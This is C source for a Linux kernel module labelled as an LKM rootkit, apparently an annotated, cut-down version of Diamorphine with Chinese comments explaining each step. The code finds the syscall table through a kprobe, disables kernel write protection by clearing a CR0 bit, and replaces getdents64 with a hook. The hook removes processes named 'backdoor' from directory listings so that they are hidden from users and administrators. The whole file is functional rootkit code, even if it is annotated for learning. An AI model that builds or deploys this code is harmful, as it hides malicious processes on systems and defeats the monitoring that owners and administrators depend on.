#include <linux/sched.h>
#include <linux/module.h>
#include <linux/syscalls.h>
#include <linux/dirent.h>
#include <linux/slab.h>
#include <linux/version.h>
#include <linux/proc_ns.h>

#include <linux/fdtable.h>

#define MAX_BUF 512

#ifndef __NR_getdents
#define __NR_getdents 141
#endif

#include "diamorphine.h"

unsigned long cr0;
static unsigned long *__sys_call_table;

typedef asmlinkage long (*t_syscall)(const struct pt_regs *);
static t_syscall orig_getdents64;

// 获取了系统调用表的地址
unsigned long *get_syscall_table_bf(void) {
  unsigned long *syscall_table;

// 定义了这个宏
#ifdef KPROBE_LOOKUP
  printk("Defined KPROBE");
  // 定义了一个函数指针类型
  typedef unsigned long (*kallsyms_lookup_name_t)(const char *name);
  // 声明了一个函数指针变量
  kallsyms_lookup_name_t kallsyms_lookup_name;
  // 注册内核探测点，函数为symbol_name = "kallsyms_lookup_name"
  register_kprobe(&kp);
  kallsyms_lookup_name = (kallsyms_lookup_name_t)kp.addr;
  unregister_kprobe(&kp);
#endif
  syscall_table = (unsigned long *)kallsyms_lookup_name("sys_call_table");
  printk("syscall_table found,0x%lx\n", syscall_table);
  return syscall_table;
}

// int get_process_name(int pid, char *name, size_t len) {
//   FILE *fp;
//   char file_path[MAX_BUF];

//   // 构建文件路径
//   snprintf(file_path, sizeof(file_path), "/proc/%d/comm", pid);

//   // 打开文件
//   fp = fopen(file_path, "r");
//   if (fp == NULL) {
//     fprintf(stderr, "Failed to open file\n");
//     return -1;
//   }

//   // 读取文件内容
//   if (fgets(name, len, fp) == NULL) {
//     fprintf(stderr, "Failed to read content\n");
//     fclose(fp);
//     return -1;
//   }

//   // 去除末尾的换行符
//   name[strcspn(name, "\n")] = 0;

//   // 关闭文件
//   fclose(fp);
//   return 0;
// }

struct task_struct *find_task(pid_t pid) {
  struct task_struct *p = current;
  for_each_process(p) {
    if (p->pid == pid)
      return p;
  }
  return NULL;
}

int is_invisible(pid_t pid) {
  struct task_struct *task;
  if (!pid)
    return 0;
  task = find_task(pid);
  if (!task)
    return 0;
  if (memcmp(task->comm, "backdoor", strlen("backdoor")) == 0)
    return 1;
  return 0;
}

int is_backdoor(struct linux_dirent64 *dir) {
  return is_invisible(simple_strtoul(dir->d_name, NULL, 10));
}

static asmlinkage long hacked_getdents64(const struct pt_regs *pt_regs) {
  // 从寄存器中读取文件描述符的值
  int fd = (int)pt_regs->di;
  // 读取目录项的指针
  struct linux_dirent *dirent = (struct linux_dirent *)pt_regs->si;
  // 调用原始的getdents，获取完整的结果
  int ret = orig_getdents64(pt_regs), err;
  unsigned short proc = 0;
  unsigned long off = 0;
  struct linux_dirent64 *dir, *kdirent, *prev = NULL;
  struct inode *d_inode;

  if (ret <= 0)
    return ret;
  // 分配一块内核区域，大小为ret
  kdirent = kzalloc(ret, GFP_KERNEL);
  if (kdirent == NULL)
    return ret;
  // 将目录项信息从用户空间拷贝到内核空间
  err = copy_from_user(kdirent, dirent, ret);
  if (err)
    goto out;
  // 查找每一个目录项
  while (off < ret) {
    // 获得当前目录项
    dir = (void *)kdirent + off;
    // 如果是需要隐藏的后门程序
    if (is_backdoor(dir)) {
      // 如果这个目录项是第一个，那么需要将后面的移到第一个来
      if (dir == kdirent) {
        ret -= dir->d_reclen;
        memmove(dir, (void *)dir + dir->d_reclen, ret);
        continue;
      }
      // 如果这个目录项不是第一个，那只需要将前面一个目录项的长度增加，覆盖自己
      prev->d_reclen += dir->d_reclen;
    } else
      // 如果不需要隐藏，记录一下prev
      prev = dir;
    // 修改偏移量，以便取到下一个目录项
    off += dir->d_reclen;
  }
  // 将内核信息拷贝到用户态
  err = copy_to_user(dirent, kdirent, ret);
  if (err)
    goto out;
out:
  kfree(kdirent);
  return ret;
}

static inline void write_cr0_forced(unsigned long val) {
  unsigned long __force_order;

  asm volatile("mov %0, %%cr0" : "+r"(val), "+m"(__force_order));
}

static inline void protect_memory(void) { write_cr0_forced(cr0); }

static inline void unprotect_memory(void) {
  write_cr0_forced(cr0 & ~0x00010000);
}

static int __init diamorphine_init(void) {
  // 获取系统调用表的地址
  __sys_call_table = get_syscall_table_bf();
  if (!__sys_call_table)
    return -1;
  // 读取寄存器
  cr0 = read_cr0();
  // 将getdents64系统调用函数的地址取出来
  orig_getdents64 = (t_syscall)__sys_call_table[__NR_getdents64];
  // 通过将cr0某位置为0，取消对内核的写保护
  unprotect_memory();
  // 修改系统调用表的getdents为我们自己的函数
  __sys_call_table[__NR_getdents64] = (unsigned long)hacked_getdents64;
  // 将cr0的值恢复，即不可以修改内核了
  protect_memory();
  printk("IN\n");
  return 0;
}

static void __exit diamorphine_cleanup(void) {
  unprotect_memory();
  __sys_call_table[__NR_getdents64] = (unsigned long)orig_getdents64;
  protect_memory();

  printk("OUT\n");
}

module_init(diamorphine_init);
module_exit(diamorphine_cleanup);

MODULE_LICENSE("Dual BSD/GPL");
MODULE_AUTHOR("m0nad");
MODULE_DESCRIPTION("LKM rootkit");